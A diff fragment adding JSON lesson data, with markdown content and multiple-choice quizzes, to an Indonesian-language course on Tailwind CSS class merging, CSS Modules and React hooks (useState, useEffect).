+              "Tampilan default di desktop 1 kolom dan di mobile 3 kolom.",
+              "Tampilan selalu 3 kolom di seluruh perangkat.",
+              "Tampilan grid dimatikan di perangkat tablet."
+            ],
+            "correctIndex": 0,
+            "explanation": "Tailwind mengusung prinsip mobile-first di mana gaya tanpa prefix berlaku di layar terkecil, dan prefix md: menambahkan aturan progresif pada layar $ge 768$px."
+          },
+          {
+            "id": "q-13-3-2",
+            "question": "Bagaimana cara menyetel warna latar belakang elemen agar berwarna putih di mode terang (light mode) dan otomatis berubah menjadi abu-abu gelap di mode gelap (dark mode)?",
+            "options": [
+              "bg-white dark:bg-neutral-900",
+              "bg-theme(white, neutral-900)",
+              "color: light-white dark-slate",
+              "background-auto: true"
+            ],
+            "correctIndex": 0,
+            "explanation": "Prefix dark:bg-neutral-900 menimpa kelas bg-white secara otomatis saat class dark atau preferensi sistem operasi dark mode aktif."
+          },
+          {
+            "id": "q-13-3-3",
+            "question": "Modifier Tailwind manakah yang digunakan untuk memberikan styling feedback saat sebuah tombol sedang ditekan (klik mouse ditahan)?",
+            "options": [
+              "active: (contoh: active:scale-95)",
+              "hover:",
+              "focus:",
+              "visited:"
+            ],
+            "correctIndex": 0,
+            "explanation": "active: menargetkan pseudo-class CSS :active yang terpicu saat pengguna menekan tombol mouse atau menyentuh layar sentuh."
+          }
+        ]
+      },
+      {
+        "id": "lesson-13-4",
+        "stageId": "stage-13",
+        "slug": "clsx-dan-tailwind-merge-cn-helper",
+        "title": "Penggabungan Kelas Dinamis: clsx & tailwind-merge (cn helper)",
+        "titleEn": "Dynamic Class Merging: clsx & tailwind-merge",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 15,
+        "description": "Menyelesaikan konflik penimpaan kelas Tailwind dengan tailwind-merge, conditional classes dengan clsx, dan menyusun fungsi utilitas standar industri `cn()`.",
+        "prerequisites": [
+          "pseudo-classes-responsive-modifiers-dan-dark-mode"
+        ],
+        "learningObjectives": [
+          "Mendiagnosis masalah Class Precedence Conflict pada Tailwind CSS (mengapa penimpaan string biasa sering gagal).",
+          "Menggabungkan kelas secara kondisional menggunakan library clsx.",
+          "Menyelesaikan konflik spesifisitas kelas Tailwind secara cerdas menggunakan tailwind-merge.",
+          "Membangun fungsi utilitas standar `cn(...inputs)` (seperti pada Shadcn UI)."
+        ],
+        "whyMatters": "Tanpa `tailwind-merge`, mengirimkan `className='p-6'` ke komponen yang memiliki default `p-4` akan membuat browser bingung dan mempertahankan `p-4` akibat urutan file CSS.",
+        "careerContext": "Fungsi `cn()` adalah fondasi mutlak dari seluruh komponen library modern (Shadcn UI, Radix UI, Aceternity).",
+        "commonMistakes": [
+          "Menggabungkan string kelas dengan Template Literals biasa `${defaultClass} ${customClass}` yang menyebabkan konflik penimpaan properti.",
+          "Lupa memasang paket `clsx` dan `tailwind-merge`."
+        ],
+        "keyTerms": [
+          {
+            "term": "clsx",
+            "definition": "Utilitas ringan untuk merangkai nama kelas CSS secara kondisional berdasarkan objek boolean."
+          },
+          {
+            "term": "tailwind-merge (twMerge)",
+            "definition": "Fungsi cerdas yang menyelesaikan konflik antar kelas utilitas Tailwind tanpa masalah spesifisitas."
+          },
+          {
+            "term": "cn() helper",
+            "definition": "Fungsi gabungan standar `twMerge(clsx(inputs))` untuk mengelola seluruh className komponen React."
+          }
+        ],
+        "contentMd": "# Penggabungan Kelas Dinamis: clsx & tailwind-merge (cn helper)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari salah satu rahasia arsitektur komponen terpenting di ekosistem React modern: **masalah konflik kelas Tailwind**, fungsi **`clsx`**, **`tailwind-merge`**, serta merakit fungsi utilitas standar industri: **`cn()`**.\n\n## Mengapa Konsep Ini Penting?\nPerhatikan masalah klasik ini:\n```tsx\n// Komponen Tombol memiliki kelas bawaan: \"p-4 bg-blue-500\"\nfunction Button({ className }) {\n  // Pengguna memanggil: <Button className=\"p-8 bg-red-500\" />\n  return <button className={`p-4 bg-blue-500 ${className}`}>Klik</button>;\n}\n```\nDi browser, elemen dirender dengan class: `\"p-4 bg-blue-500 p-8 bg-red-500\"`.  \n**Hasilnya**: Tombol mungkin **TETAP berwarna biru** atau **TETAP memiliki padding p-4**! Mengapa? Karena di file CSS yang di-generate Tailwind, aturan `p-4` bisa saja ditulis setelah `p-8`. Urutan string di HTML tidak menentukan siapa yang menang di CSS!\n\n## 1. Solusi Cerdas: `tailwind-merge`\nLibrary `tailwind-merge` memahami hierarki Tailwind. Jika ia melihat ada `p-4` dan `p-8`, ia otomatis **menghapus `p-4`** dan hanya mempertahankan `p-8`:\n\n```typescript\nimport { twMerge } from \"tailwind-merge\";\n\ntwMerge(\"p-4 bg-blue-500\", \"p-8 bg-red-500\");\n// Hasil Bersih: \"p-8 bg-red-500\" (Konflik terselesaikan 100%!)\n```\n\n## 2. Conditional Classes dengan `clsx`\n`clsx` memungkinkan kita mengaktifkan kelas berdasarkan kondisi boolean:\n\n```typescript\nimport { clsx } from \"clsx\";\n\nclsx(\"btn\", {\n  \"btn-aktif\": isActive,\n  \"opacity-50\": isDisabled\n});\n```\n\n## 3. Resep Emas: Membuat Fungsi Utilitas `cn()`\nGabungkan kekuatan keduanya menjadi 1 fungsi sakti di file `src/lib/utils.ts` (Standar Shadcn UI):\n\n```typescript\n// File: src/lib/utils.ts\nimport { clsx, type ClassValue } from \"clsx\";\nimport { twMerge } from \"tailwind-merge\";\n\nexport function cn(...inputs: ClassValue[]) {\n  return twMerge(clsx(inputs));\n}\n```\n\n### Cara Penggunaan di Komponen React:\n```tsx\nimport { cn } from \"@/lib/utils\";\n\ninterface ButtonProps {\n  varian?: \"primer\" | \"bahaya\";\n  ukuranBesar?: boolean;\n  className?: string; // Custom class dari luar\n  children: React.ReactNode;\n}\n\nexport function Button({ varian = \"primer\", ukuranBesar, className, children }: ButtonProps) {\n  return (\n    <button\n      className={cn(\n        // 1. Gaya Dasar Bawaan:\n        \"px-4 py-2 rounded-lg font-medium transition-colors\",\n        // 2. Varian Kondisional:\n        varian === \"primer\" && \"bg-blue-600 text-white hover:bg-blue-700\",\n        varian === \"bahaya\" && \"bg-red-600 text-white hover:bg-red-700\",\n        ukuranBesar && \"text-lg px-6 py-3\",\n        // 3. Override Custom Class dari User (Aman & Tidak Pernah Bentrok!):\n        className\n      )}\n    >\n      {children}\n    </button>\n  );\n}\n```\n\n## Kesalahan Umum Pemula\n- **Hanya memakai template literal biasa**: Mengabaikan fungsi `cn()` yang mengakibatkan props `className` yang dikirim pengguna gagal menimpa styling bawaan komponen.\n\n## Praktik Mandiri\n1. Buat helper `cn()` di proyek latihan Anda.\n2. Buat komponen `Badge` dan buktikan bahwa mengirimkan `className=\"bg-purple-500\"` sukses menimpa `bg-gray-100` bawaannya.\n\n## Ringkasan\n- Menggabungkan kelas Tailwind dengan string biasa memicu konflik urutan CSS (*Class Precedence Bug*).\n- **`clsx`** mengelola kelas berbasis logika kondisional.\n- **`tailwind-merge`** secara cerdas menghapus kelas utilitas lama yang bertentangan.\n- Fungsi **`cn()`** adalah standar industri untuk membuat komponen React yang dapat di-override dengan aman.",
+        "quizzes": [
+          {
+            "id": "q-13-4-1",
+            "question": "Mengapa menggabungkan kelas Tailwind hanya menggunakan template string biasa (contoh: `${defaultClass} ${customClass}`) sering kali gagal menimpa warna atau padding bawaan komponen?",
+            "options": [
+              "Karena aturan spesifisitas CSS ditentukan oleh urutan deklarasi kelas di stylesheet yang dihasilkan compiler, bukan berdasarkan urutan penulisan string di atribut HTML.",
+              "Karena browser Chrome memblokir template literals.",
+              "Karena Tailwind melarang pengiriman props className.",
+              "Karena template literals hanya bisa menampung 10 karakter."
+            ],
+            "correctIndex": 0,
+            "explanation": "Jika p-4 dideklarasikan belakangan di file CSS dibanding p-8, menulis 'p-4 p-8' di HTML tetap akan memenangkan p-4 kecuali diselesaikan dengan tailwind-merge."
+          },
+          {
+            "id": "q-13-4-2",
+            "question": "Apa fungsi dari library tailwind-merge di dalam ekosistem styling React?",
+            "options": [
+              "Menganalisis konflik antar kelas utilitas Tailwind yang bertentangan (seperti p-4 vs p-8) dan menghapus kelas lama secara cerdas sehingga kelas baru menang dengan benar.",
+              "Mengompresi file gambar PNG menjadi WebP.",
+              "Mengubah JavaScript menjadi file database SQL.",
+              "Menghapus seluruh file Tailwind dari proyek."
+            ],
+            "correctIndex": 0,
+            "explanation": "tailwind-merge memahami domain kelas utilitas Tailwind dan membuang kelas utilitas redundan yang saling bertentangan."
+          },
+          {
+            "id": "q-13-4-3",
+            "question": "Di dalam standar industri komponen modern (seperti Shadcn UI), fungsi utilitas cn(...inputs) merupakan gabungan dari library apa?",
+            "options": [
+              "clsx dan tailwind-merge (twMerge(clsx(inputs)))",
+              "react dan react-dom",
+              "typescript dan prettier",
+              "lodash dan axios"
+            ],
+            "correctIndex": 0,
+            "explanation": "cn helper menggabungkan evaluasi kondisional clsx dengan resolusi konflik spesifisitas tailwind-merge."
+          }
+        ]
+      },
+      {
+        "id": "lesson-13-5",
+        "stageId": "stage-13",
+        "slug": "css-modules-dan-scoped-styling",
+        "title": "CSS Modules & Scoped Styling (Alternatif Terisolasi)",
+        "titleEn": "CSS Modules & Scoped Styling",
+        "level": "BEGINNER",
+        "estimatedMinutes": 12,
+        "description": "Memahami isolasi gaya komponen dengan CSS Modules (file.module.css), pembuatan nama class hash unik otomatis, dan kapan memilih CSS Modules vs Tailwind CSS.",
+        "prerequisites": [
+          "clsx-dan-tailwind-merge-cn-helper"
+        ],
+        "learningObjectives": [
+          "Menerapkan CSS Modules dengan konvensi penamaan file `NamaKomponen.module.css`.",
+          "Menjelaskan bagaimana CSS Modules menghasilkan nama kelas unik (Scoped CSS Hash) untuk mencegah tabrakan gaya global.",
+          "Menganalisis perbandingan kasus penggunaan CSS Modules vs Tailwind CSS."
+        ],
+        "whyMatters": "CSS Modules adalah alternatif native resmi di Next.js dan Vite yang memungkinkan penulisan CSS murni yang 100% terisolasi per komponen.",
+        "careerContext": "Banyak perusahaan dengan legacy design system berbasis SASS/CSS murni menggunakan CSS Modules untuk isolasi komponen.",
+        "commonMistakes": [
+          "Lupa menyertakan kata `.module.` pada nama file (misal menulis `Button.css` alih-alih `Button.module.css`), sehingga gaya menjadi global dan bocor ke seluruh halaman.",
+          "Mencoba menulis selector tag global di dalam file module."
+        ],
+        "keyTerms": [
+          {
+            "term": "CSS Modules",
+            "definition": "File CSS di mana semua nama kelas discoped secara lokal ke komponen terkait secara otomatis pada saat build."
+          },
+          {
+            "term": "Scoped Styling",
+            "definition": "Isolasi gaya sehingga aturan CSS pada satu komponen dijamin tidak akan pernah bocor memengaruhi komponen lain."
+          },
+          {
+            "term": "Hashed Class Names",
+            "definition": "Nama kelas terenkripsi otomatis (seperti `Button_tombol__a8f3d`) yang dihasilkan compiler build."
+          }
+        ],
+        "contentMd": "# CSS Modules & Scoped Styling (Alternatif Terisolasi)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari alternatif styling terisolasi: **CSS Modules** (`*.module.css`), bagaimana bundler menghasilkan **Scoped Class Names** yang unik, serta kapan Anda sebaiknya memilih CSS Modules dibandingkan Tailwind CSS.\n\n## Mengapa Konsep Ini Penting?\nJika Anda atau tim Anda lebih suka menulis kode CSS murni (*Vanilla CSS*) daripada utility classes, bagaimana cara mencegah agar kelas `.tombol` di file Anda tidak merusak kelas `.tombol` milik developer lain? Jawabannya adalah **CSS Modules**.\n\n## 1. Cara Kerja CSS Modules\nCukup buat file dengan ekstensi khusus **`.module.css`**:\n\n```css\n/* File: src/components/Tombol.module.css */\n.tombolUtama {\n  background-color: #2563eb;\n  color: white;\n  padding: 12px 24px;\n  border-radius: 8px;\n  border: none;\n  font-weight: 600;\n  cursor: pointer;\n  transition: background-color 0.2s ease;\n}\n\n.tombolUtama:hover {\n  background-color: #1d4ed8;\n}\n```\n\n## 2. Mengimpor dan Menggunakan di Komponen React\n\n```tsx\n// File: src/components/Tombol.tsx\nimport styles from \"./Tombol.module.css\";\n\nexport function Tombol() {\n  // styles.tombolUtama menghasilkan string unik: \"Tombol_tombolUtama__x7k9p\"\n  return (\n    <button className={styles.tombolUtama}>\n      Klik Saya\n    </button>\n  );\n}\n```\n\n### Apa yang Terjadi di Balik Layar?\nSaat proses build, bundler (Vite / Next.js) mengubah nama kelas menjadi hash unik:\n```html\n<!-- Hasil di DOM Browser: -->\n<button class=\"Tombol_tombolUtama__x7k9p\">Klik Saya</button>\n```\nKarena namanya memiliki hash unik terenkripsi, kelas ini **TIDAK AKAN PERNAH bertabrakan** dengan kelas manapun di seluruh jagat aplikasi Anda!\n\n## 3. Kapan Memilih Tailwind CSS vs CSS Modules?\n- **Pilih Tailwind CSS (Rekomendasi Utama Modern)**: Jika Anda ingin kecepatan prototyping tinggi, tidak ingin memikirkan nama class, dan ingin ukuran file CSS produksi yang sangat kecil.\n- **Pilih CSS Modules**: Jika Anda memiliki stylesheet CSS/SASS kustom yang rumit, animasi keyframes yang sangat spesifik, atau bermigrasi dari proyek lama tanpa Tailwind.\n\n## Kesalahan Umum Pemula\n- **Lupa format nama file**: Menamai file `Button.css` tanpa kata `.module.`. File `Button.css` biasa akan diperlakukan sebagai Global CSS yang bocor ke seluruh website!\n\n## Praktik Mandiri\n1. Buat file `Card.module.css` dengan kelas `.kartuBox`.\n2. Impor sebagai objek `styles` dan sematkan pada komponen `<div className={styles.kartuBox}>`.\n\n## Ringkasan\n- File **`*.module.css`** mengisolasi gaya secara lokal (*Scoped Styling*).\n- Menghasilkan nama kelas ber-hash unik otomatis untuk mencegah tabrakan gaya global.\n- Solusi sempurna jika Anda ingin menulis CSS murni tanpa takut merusak komponen lain.",
+        "quizzes": [
+          {
+            "id": "q-13-5-1",
+            "question": "Bagaimana cara CSS Modules mencegah tabrakan nama kelas (global class name collision) antar komponen yang berbeda?",
+            "options": [
+              "Compiler build secara otomatis mengubah nama kelas menjadi string ber-hash unik lokal (contoh: Button_tombol__a8f3d) yang hanya terikat pada komponen tersebut.",
+              "CSS Modules menghapus seluruh nama kelas dan menggantinya dengan inline style.",
+              "CSS Modules menolak file CSS yang memiliki nama sama.",
+              "CSS Modules membatasi jumlah baris kode menjadi maksimal 10 baris."
+            ],
+            "correctIndex": 0,
+            "explanation": "Scoping lokal CSS Modules bekerja dengan men-generate identifier unik berupa hash per file komponen."
+          },
+          {
+            "id": "q-13-5-2",
+            "question": "Konvensi penamaan file apakah yang WAJIB digunakan agar bundler mengenali file stylesheet sebagai CSS Module terisolasi?",
+            "options": [
+              "NamaKomponen.module.css (atau .module.scss)",
+              "NamaKomponen.css",
+              "NamaKomponen.scoped.style",
+              "NamaKomponen.local.stylesheet"
+            ],
+            "correctIndex": 0,
+            "explanation": "Ekstensi .module.css adalah konvensi resmi standar yang dikenali otomatis oleh Vite, Next.js, dan Webpack untuk isolasi module styling."
+          },
+          {
+            "id": "q-13-5-3",
+            "question": "Bagaimana cara menyematkan kelas dari file CSS Module ke dalam elemen JSX komponen React?",
+            "options": [
+              "Mengimpor file sebagai objek (import styles from './Card.module.css') lalu menyematkan className={styles.namaKelas}",
+              "Menuliskan <link rel='stylesheet'> di dalam JSX",
+              "Menuliskan className='Card.module.css.namaKelas'",
+              "CSS Module otomatis terpasang tanpa perlu diimpor"
+            ],
+            "correctIndex": 0,
+            "explanation": "CSS Modules diimpor sebagai objek JavaScript default yang memetakan nama kelas asli ke nama hash yang dihasilkan compiler."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-14",
+    "orderIndex": 14,
+    "titleId": "React Hooks Deep Dive: State, Effects & Context",
+    "titleEn": "React Hooks Deep Dive: State, Effects & Context",
+    "category": "Frontend",
+    "description": "Menguasai ekosistem React Hooks: Rules of Hooks, useState (functional updates, batching), useEffect & cleanup, useRef (DOM & mutable ref), useMemo vs useCallback, dan useContext.",
+    "descriptionEn": "Master React Hooks: Rules of Hooks, useState, useEffect & cleanup, useRef, useMemo, useCallback, and useContext.",
+    "lessons": [
+      {
+        "id": "lesson-14-1",
+        "stageId": "stage-14",
+        "slug": "rules-of-hooks-dan-useState-deep-dive",
+        "title": "Rules of Hooks & useState Deep Dive (Batching, Functional Updates)",
+        "titleEn": "Rules of Hooks & useState Deep Dive",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Memahami 2 Aturan Wajib Hooks, alur render React, useState asynchronous updates, Automatic Batching di React 18+, dan Functional State Updates `setCount(prev => prev + 1)`.",
+        "prerequisites": [
+          "css-modules-dan-scoped-styling"
+        ],
+        "learningObjectives": [
+          "Menjelaskan 2 Aturan Wajib Hooks: Hanya panggil di level teratas komponen, dan hanya panggil dari fungsi React.",
+          "Menganalisis mengapa pembaruan state bersifat asinkron dan bagaimana mekanisme Automatic Batching bekerja.",
+          "Menerapkan Functional State Updates `setVal(prev => ...)` untuk mencegah bug stale state closure.",
+          "Menerapkan Lazy Initial State `useState(() => hitungBerat())` untuk operasi inisialisasi yang memakan komputasi tinggi."
+        ],
+        "whyMatters": "Menggunakan functional updates mencegah bug balapan state saat user mengklik tombol berkali-kali secara cepat.",
+        "careerContext": "Memahami internal batching dan snapshot state adalah pembeda developer React junior dan senior.",
+        "commonMistakes": [
+          "Memanggil hooks di dalam blok `if` atau `for` loop yang merusak urutan array memori internal React.",
+          "Menulis `setCount(count + 1)` berulang kali dalam satu fungsi dan heran mengapa nilainya hanya bertambah 1.",
+          "Membaca nilai state tepat di baris berikutnya setelah `setCount` dan bingung mengapa nilainya masih nilai lama (karena state bertindak sebagai Snapshot render saat ini)."
+        ],
+        "keyTerms": [
+          {
+            "term": "useState",
+            "definition": "Hook fundamental React untuk mendeklarasikan variabel state lokal yang memicu re-render saat nilainya diperbarui."
+          },
+          {
+            "term": "Functional Update",
+            "definition": "Pembaruan state dengan meneruskan fungsi updater `prev => prev + 1` untuk menjamin akses ke nilai state paling mutakhir."
+          },
+          {
+            "term": "Automatic Batching",
+            "definition": "Fitur React 18+ yang menggabungkan beberapa pembaruan state sekaligus menjadi satu kali re-render demi performa."
+          },
+          {
+            "term": "State Snapshot",
+            "definition": "Prinsip bahwa nilai state di dalam satu kali eksekusi render bersifat konstan seperti foto snapshot."
+          }
+        ],
+        "contentMd": "# Rules of Hooks & useState Deep Dive (Batching, Functional Updates)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan membedah cara kerja internal **React Hooks**: **2 Aturan Wajib Hooks**, bagaimana **`useState`** bekerja di bawah kap mesin, prinsip **State Snapshot**, fitur **Automatic Batching**, serta mengapa Anda wajib menggunakan **Functional State Updates**.\n\n## Mengapa Konsep Ini Penting?\nPernahkah Anda menulis kode seperti ini:\n```tsx\nsetCount(count + 1);\nsetCount(count + 1);\nsetCount(count + 1);\n// Mengapa nilai count hanya bertambah 1, bukan 3?\n```\nMemahami mekanisme rendering dan closure snapshot pada `useState` akan mengeliminasi kebingungan tersebut selamanya.\n\n## 1. Dua (2) Aturan Wajib Hooks (Rules of Hooks)\nReact mengandalkan **urutan pemanggilan hooks yang stabil** di setiap siklus render untuk mengaitkan state dengan komponen yang benar:\n\n1. **HANYA Panggil Hooks di Level Teratas Komponen**:  \n   Jangan pernah memanggil hooks di dalam blok **`if`**, perulangan **`for`**, atau fungsi bersarang (*nested functions*).\n2. **HANYA Panggil Hooks dari Komponen Fungsional React atau Custom Hooks**:  \n   Jangan memanggil hooks dari fungsi JavaScript reguler biasa.\n\n```tsx\n// SANGAT DILARANG (Merusak Internal Memory Array React!):\nfunction KomponenRusak({ isLogin }: { isLogin: boolean }) {\n  if (isLogin) {\n    useState(0); // ERROR: Hooks tidak boleh di dalam IF!\n  }\n}\n```\n\n## 2. Prinsip State sebagai Snapshot\nNilai state di dalam satu kali siklus render adalah sebuah **Snapshot foto statis**. Memanggil `setCount(count + 1)` tidak mengubah variabel `count` saat itu juga, melainkan *menjadwalkan render baru* untuk siklus berikutnya:\n\n```tsx\nconst [skor, setSkor] = useState(0);\n\nfunction handleKlik() {\n  setSkor(skor + 1);\n  console.log(skor); // MASIH 0! (Karena skor adalah snapshot render saat ini)\n}\n```\n\n## 3. Penyelamat: Functional State Updates (`prev => ...`)\nJika pembaruan state baru Anda bergantung pada nilai state sebelumnya, **SELALU gunakan fungsi updater**:\n\n```tsx\nfunction tambahTiga() {\n  // React mengantrekan fungsi updater ini satu per satu:\n  setCount(prev => prev + 1); // prev = 0 -> return 1\n  setCount(prev => prev + 1); // prev = 1 -> return 2\n  setCount(prev => prev + 1); // prev = 2 -> return 3\n  // Hasil Akhir: NILAI BERHASIL BERTAMBAH 3!\n}\n```\n\n## 4. Lazy Initial State untuk Komputasi Berat\nJika inisialisasi state membutuhkan pembacaan `localStorage` yang lambat, bungkus dalam fungsi (*Lazy Initializer*) agar **hanya dieksekusi 1 kali saat komponen pertama kali lahir**:\n\n```tsx\n// CARA BENAR (Lazy Init):\nconst [data, setData] = useState(() => {\n  console.log(\"Hanya berjalan 1x saat inisialisasi\");\n  return JSON.parse(localStorage.getItem(\"data_berat\") || \"[]\");\n});\n```\n\n## Kesalahan Umum Pemula\n- **Mutasi State Objek Langsung**: Menulis `user.nama = \"Baru\"; setUser(user);` tidak akan memicu re-render karena referensi memorinya sama. Wajib gunakan salinan baru: `setUser({ ...user, nama: \"Baru\" })`.\n\n## Praktik Mandiri\n1. Buat counter dengan tombol yang memanggil `setCount(prev => prev + 1)`.\n2. Buat state objek `const [user, setUser] = useState({ name: 'Acel', age: 24 })` dan perbarui usia dengan `setUser(prev => ({ ...prev, age: prev.age + 1 }))`.\n\n## Ringkasan\n- Selalu patuhi **Rules of Hooks**: hanya panggil di level teratas komponen.\n- State bertindak sebagai **Snapshot** pada setiap render.\n- Selalu gunakan **Functional Updates (`prev => ...`)** saat menghitung state dari nilai sebelumnya.\n- Selalu terapkan **Immutability (Spread `{...prev}`)** saat memperbarui state objek/array.",
+        "quizzes": [
+          {
+            "id": "q-14-1-1",
+            "question": "Mengapa React secara ketat melarang pemanggilan Hooks (seperti useState atau useEffect) di dalam blok percabangan if atau perulangan for loop?",
+            "options": [
+              "Karena React mengandalkan urutan pemanggilan hooks yang stabil dan konsisten pada setiap siklus render untuk mencocokkan internal memory state dengan komponen yang tepat.",
+              "Karena compiler TypeScript tidak mendukung kurung kurawal di dalam if.",
+              "Karena blok if mematikan memori browser.",
+              "Agar ukuran file JavaScript tidak membesar."
+            ],
+            "correctIndex": 0,
+            "explanation": "React menyimpan state hooks dalam array linked-list internal berurutan. Perubahan jumlah/urutan hooks akibat blok conditional merusak pemetaan state."
+          },
+          {
+            "id": "q-14-1-2",
+            "question": "Perhatikan fungsi berikut:\nfunction handleMultipleClicks() {\n  setCount(prev => prev + 1);\n  setCount(prev => prev + 1);\n  setCount(prev => prev + 1);\n}\nJika nilai awal count adalah 0, berapa nilai count setelah fungsi tersebut dieksekusi?",
+            "options": [
+              "3",
+              "1",
+              "0",
+              "undefined"
+            ],
+            "correctIndex": 0,
+            "explanation": "Functional state updates mengantrekan fungsi updater secara berantai di mana setiap pemanggilan menerima nilai state paling mutakhir dari antrean (0 -> 1 -> 2 -> 3)."
+          },
+          {
+            "id": "q-14-1-3",
+            "question": "Bagaimana cara yang benar untuk memperbarui properti 'kota' pada state objek: const [profil, setProfil] = useState({ nama: 'Acelino', kota: 'Jakarta' })?",
+            "options": [
+              "setProfil(prev => ({ ...prev, kota: 'Bandung' }))",
+              "profil.kota = 'Bandung'; setProfil(profil);",
+              "setProfil('kota', 'Bandung')",
+              "profil = { ...profil, kota: 'Bandung' }"
+            ],
+            "correctIndex": 0,
+            "explanation": "Prinsip immutability mewajibkan pembuatan objek salinan baru via spread operator {...prev} saat memperbarui sebagian properti state objek."
+          }
+        ]
+      },
+      {
+        "id": "lesson-14-2",
+        "stageId": "stage-14",
+        "slug": "useeffect-lifecycle-dan-cleanup-functions",
+        "title": "useEffect: Sinkronisasi, Dependency Array & Cleanup",
+        "titleEn": "useEffect: Lifecycle, Dependencies & Cleanup",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Menghubungkan komponen ke sistem eksternal dengan useEffect, 3 variasi Dependency Array, fungsi Cleanup (mencegah memory leak), dan Strict Mode double-effect.",
+        "prerequisites": [
+          "rules-of-hooks-dan-useState-deep-dive"
+        ],
+        "learningObjectives": [
+          "Menjelaskan peran useEffect untuk sinkronisasi side effects dengan sistem eksternal (API, WebSocket, event listener).",
+          "Membedakan 3 variasi Dependency Array: tanpa array (setiap render), array kosong `[]` (mount saja), dan array berpenghuni `[dep1, dep2]`.",
+          "Menerapkan Cleanup Function untuk membersihkan timer `clearInterval` dan listener `removeEventListener`.",
+          "Menjelaskan mengapa React 18 Strict Mode menjalankan effect dua kali di development (Double Invoke)."
+        ],
+        "whyMatters": "Lupa membersihkan interval timer atau event listener pada `useEffect` menyebabkan kebocoran memori (*Memory Leak*) yang membuat browser lambat.",
+        "careerContext": "Penulisan dependency array yang keliru adalah penyebab nomor satu bug infinite re-render di aplikasi React.",
+        "commonMistakes": [
+          "Mengabaikan peringatan linter `react-hooks/exhaustive-deps` dengan sengaja menghilangkan dependensi yang digunakan di dalam effect.",
+          "Menggunakan `useEffect` untuk menghitung data turunan yang sebenarnya bisa dihitung langsung saat render biasa.",
+          "Lupa me-return fungsi cleanup pada langganan timer/event."
+        ],
+        "keyTerms": [
+          {
+            "term": "Side Effect",
+            "definition": "Operasi yang berinteraksi dengan dunia di luar komponen React (Data Fetching, Subscription, Manual DOM Mutation, Timers)."
+          },
+          {
+            "term": "Dependency Array",
+            "definition": "Array argumen kedua pada `useEffect` yang menentukan kapan effect harus dijalankan ulang."
+          },
+          {
+            "term": "Cleanup Function",
+            "definition": "Fungsi yang di-return oleh `useEffect` yang dieksekusi sebelum effect berikutnya berjalan atau saat komponen unmount."
+          }
+        ],
+        "contentMd": "# useEffect: Sinkronisasi, Dependency Array & Cleanup\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari **`useEffect`**: hook untuk menyinkronkan komponen dengan sistem eksternal (*Side Effects*), 3 aturan **Dependency Array**, peran krusial **Cleanup Function** (mencegah *Memory Leak*), serta alasan mengapa **React 18 Strict Mode** menjalankan effect dua kali di development.\n\n## Mengapa Konsep Ini Penting?\nKomponen React seharusnya berupa fungsi murni yang menghitung JSX. Namun terkadang Anda perlu melakukan hal-hal di luar siklus render murni: seperti memasang timer `setInterval`, menghubungkan `WebSocket`, atau mendengarkan event scroll window. Operasi ini disebut **Side Effects**.\n\n## 1. Tiga (3) Pola Dependency Array\n\n```tsx\nimport { useEffect, useState } from \"react\";\n\nexport function ContohEffect({ userId }: { userId: string }) {\n  const [data, setData] = useState(null);\n\n  // POLA 1: Tanpa Dependency Array (BERBAHAYA!)\n  // Berjalan di SETIAP KALI komponen me-render ulang\n  useEffect(() => {\n    console.log(\"Berjalan di setiap render\");\n  });\n\n  // POLA 2: Dependency Array Kosong [] (Mount Saja)\n  // Berjalan HANYA 1 KALI saat komponen pertama kali lahir di layar\n  useEffect(() => {\n    console.log(\"Komponen berhasil di-mount\");\n  }, []);\n\n  // POLA 3: Dependency Array Berpenghuni [userId]\n  // Berjalan saat mount, DAN berjalan ulang HANYA JIKA userId berubah nilai\n  useEffect(() => {\n    console.log(\"Memuat data untuk user baru:\", userId);\n    // fetchUserData(userId).then(setData);\n  }, [userId]);\n}\n```\n\n## 2. Mengapa Cleanup Function Sangat Krusial?\nJika Anda memasang timer atau event listener di dalam `useEffect`, Anda **WAJIB mengembalikan fungsi pembersih (*Cleanup Function*)**. Jika tidak dibersihkan, timer akan terus berdetak di memori latar belakang meskipun pengguna sudah pindah ke halaman lain (*Memory Leak*):\n\n```tsx\nexport function TimerDetik() {\n  const [detik, setDetik] = useState(0);\n\n  useEffect(() => {\n    // 1. Pasang Timer Interval:\n    const timerId = setInterval(() => {\n      setDetik(prev => prev + 1);\n    }, 1000);\n\n    // 2. KEMBALIKAN FUNGSI CLEANUP (Membersihkan Timer):\n    return () => {\n      console.log(\"Membersihkan interval timer saat unmount...\");\n      clearInterval(timerId);\n    };\n  }, []); // Array kosong: pasang saat mount, bersihkan saat unmount\n\n  return <div>Waktu berjalan: {detik} detik</div>;\n}\n```\n\n## 3. Mengapa Effect Berjalan 2 Kali di Development? (React 18 Strict Mode)\nSaat Anda menggunakan `<React.StrictMode>` di lingkungan development:\n- React sengaja menjalankan: **Mount $\\rightarrow$ Unmount (Jalankan Cleanup) $\\rightarrow$ Mount Lagi**.\n- **Tujuannya**: Menguji apakah kode Anda sudah memiliki fungsi Cleanup yang benar untuk mendeteksi memory leak sebelum kode dirilis ke produksi. Di production, effect hanya akan berjalan 1 kali normal.\n\n## Kesalahan Umum Pemula\n- **Memakai useEffect untuk hitung data turunan**: Jika Anda memiliki `const [firstName, setFirst] = useState()` dan `const [lastName, setLast] = useState()`, Anda TIDAK PERLU `useEffect` untuk membuat `fullName`. Cukup hitung langsung: `const fullName = `${firstName} ${lastName}`` saat render!\n\n## Praktik Mandiri\n1. Buat komponen yang mendengarkan event scroll window: `window.addEventListener('resize', handleResize)`.\n2. Pastikan Anda mengembalikan `() => window.removeEventListener('resize', handleResize)` di dalam return effect.\n\n## Ringkasan\n- **`useEffect`** menyinkronkan komponen dengan sistem di luar React.\n- **`[]`** berjalan 1x saat mount; **`[dep]`** berjalan ulang jika dependensi berubah.\n- Selalu return **Cleanup Function** untuk timer, event listener, dan subscriptions.\n- React 18 Strict Mode sengaja memicu double-effect di development untuk menguji integritas cleanup Anda.",
+        "quizzes": [
+          {
+            "id": "q-14-2-1",
+            "question": "Kapan fungsi Cleanup yang di-return oleh sebuah useEffect akan dieksekusi oleh React?",
+            "options": [
